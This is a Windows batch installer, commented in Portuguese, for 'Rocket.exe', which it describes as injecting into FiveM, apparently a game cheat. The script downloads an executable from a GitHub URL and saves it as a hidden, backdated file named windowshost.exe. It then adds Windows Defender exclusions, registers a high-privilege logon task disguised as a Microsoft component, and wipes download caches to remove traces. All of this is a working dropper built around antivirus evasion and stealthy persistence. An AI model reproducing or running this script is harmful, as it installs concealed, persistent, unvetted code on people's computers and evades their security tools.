@echo off
:: ========================================
::  INSTALADOR AUTOMATICO - ROCKET.EXE
::  Instala o Rocket.exe de forma oculta
:: ========================================

title Instalador Rocket
color 0A

:: Verificar se é Windows 10
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este programa requer Windows 10!
    pause
    exit /b 1
)

:: Verificar privilégios admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERRO] Este script precisa ser executado como Administrador!
    echo.
    echo Clique com botao direito e selecione "Executar como administrador"
    pause
    exit /b 1
)

:: URL do executável no GitHub
set "GITHUB_URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"

:: Diretório de instalação
set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\WindowsApps"

:: Criar diretório se não existir
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
)

:: Nome do executável
set "EXE_NAME=windowshost.exe"
set "INSTALL_PATH=%INSTALL_DIR%\%EXE_NAME%"

echo.
echo ========================================
echo    INSTALADOR ROCKET
echo ========================================
echo.
echo [*] Limpando instalacoes antigas...
echo.

:: ========================================
:: REMOVER TAREFAS ANTIGAS PRIMEIRO
:: ========================================
set "TASK_NAME=Microsoft\Windows\WindowsApps"
set "CLEANUP_TASK_NAME=Microsoft\Windows\WindowsApps\Cleanup"

:: Remover tarefas antigas (todas as variações possíveis)
echo [*] Removendo tarefas agendadas antigas...

schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /delete /tn "%CLEANUP_TASK_NAME%" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\RuntimeHost\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\SpeechRuntimeService" /f >nul 2>&1
schtasks /delete /tn "Microsoft\Windows\SpeechRuntimeService\Cleanup" /f >nul 2>&1
schtasks /delete /tn "Rocket" /f >nul 2>&1
schtasks /delete /tn "ZERO" /f >nul 2>&1
schtasks /delete /tn "ZERØ" /f >nul 2>&1

:: Aguardar um pouco para garantir que as tarefas foram removidas
timeout /t 2 /nobreak >nul

:: Remover também via PowerShell (mais confiável)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*RuntimeHost*' -or $_.TaskName -like '*SpeechRuntime*' -or $_.TaskName -like '*Rocket*' -or $_.TaskName -like '*ZERO*' -or $_.TaskName -like '*ZERØ*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue" >nul 2>&1

echo [OK] Tarefas antigas removidas!
echo.

:: ========================================
:: BAIXAR E INSTALAR EXECUTÁVEL
:: ========================================
echo [*] Baixando executavel do GitHub...

:: Remover arquivo antigo se existir
if exist "%INSTALL_PATH%" (
    echo [*] Removendo instalacao antiga...
    del /q /f "%INSTALL_PATH%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

:: Baixar usando certutil (método 1)
certutil -urlcache -split -f "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1

:: Se falhar, tentar PowerShell (método 2)
if not exist "%INSTALL_PATH%" (
    echo [*] Tentando metodo alternativo...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%INSTALL_PATH%' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
)

:: Se ainda falhar, tentar BitsAdmin (método 3)
if not exist "%INSTALL_PATH%" (
    echo [*] Tentando metodo alternativo 2...
    bitsadmin /transfer "Download" /download /priority high "%GITHUB_URL%" "%INSTALL_PATH%" >nul 2>&1
)

:: Verificar se o download foi bem-sucedido
if not exist "%INSTALL_PATH%" (
    echo.
    echo [ERRO] Falha ao baixar executavel do GitHub!
    echo URL: %GITHUB_URL%
    pause
    exit /b 1
)

echo [OK] Download concluido com sucesso!
echo.

:: ========================================
:: CONFIGURAR ARQUIVO
:: ========================================
echo [*] Configurando arquivo...

:: Atributos Sistema + Oculto
attrib +s +h "%INSTALL_PATH%" >nul 2>&1

:: Ocultar de buscas do Windows
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed }" >nul 2>&1

:: Definir data de modificação antiga
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$f = '%INSTALL_PATH%'; if (Test-Path $f) { $file = Get-Item $f; $file.LastWriteTime = (Get-Date).AddYears(-2); $file.CreationTime = (Get-Date).AddYears(-2) }" >nul 2>&1

:: Adicionar exceção no Windows Defender
echo [*] Adicionando excecao no Windows Defender...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%INSTALL_PATH%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1

:: ========================================
:: CRIAR TAREFA AGENDADA (SIMPLIFICADA)
:: ========================================
echo [*] Criando tarefa agendada...
echo.

:: Aguardar um pouco para garantir que as remoções anteriores foram processadas
timeout /t 1 /nobreak >nul

:: Criar tarefa agendada SIMPLES (sem cleanup, sem múltiplas execuções)
:: Usar configuração que evita loops
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$action = New-ScheduledTaskAction -Execute '%INSTALL_PATH%'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $trigger.Delay = 'PT30S'; $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew; Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description 'Componente de Host de Aplicativos do Windows' -Force" >nul 2>&1

:: Verificar se a tarefa foi criada
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorLevel% equ 0 (
    echo [OK] Tarefa agendada criada com sucesso!
    echo [*] O Rocket sera executado 30 segundos apos o logon
) else (
    echo [AVISO] Falha ao criar tarefa agendada via PowerShell
    echo [*] Tentando metodo alternativo...
    
    :: Fallback: usar schtasks
    schtasks /create /tn "%TASK_NAME%" /tr "\"%INSTALL_PATH%\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
    
    schtasks /query /tn "%TASK_NAME%" >nul 2>&1
    if %errorLevel% equ 0 (
        echo [OK] Tarefa criada via schtasks!
    ) else (
        echo [ERRO] Falha ao criar tarefa agendada!
        echo [AVISO] O programa nao iniciara automaticamente no logon.
    )
)

echo.

:: ========================================
:: LIMPEZA
:: ========================================
echo [*] Limpando rastros de instalacao...

:: Limpar cache do certutil
certutil -urlcache * delete >nul 2>&1

:: Limpar arquivos temporários
del /q /f "%TEMP%\install.bat" >nul 2>&1
del /q /f "%TEMP%\*install*" >nul 2>&1

echo [OK] Limpeza concluida!
echo.

:: ========================================
:: CONCLUSÃO
:: ========================================
echo ========================================
echo    INSTALACAO CONCLUIDA!
echo ========================================
echo.
echo [OK] Executavel instalado em:
echo     %INSTALL_PATH%
echo.
echo [OK] Tarefa agendada: %TASK_NAME%
echo [OK] O Rocket sera executado automaticamente 30 segundos
echo      apos o proximo logon (para evitar conflitos)
echo.
echo [INFO] IMPORTANTE:
echo    - Execute o Rocket apenas DEPOIS de abrir o Spotify e
echo      tocar a musica "Ghard - Pinheiros"
echo    - Em seguida, abra o FiveM
echo    - O Rocket detectara automaticamente e injetara
echo.
echo [OK] Voce pode fechar esta janela.
echo.
timeout /t 5 /nobreak >nul
exit
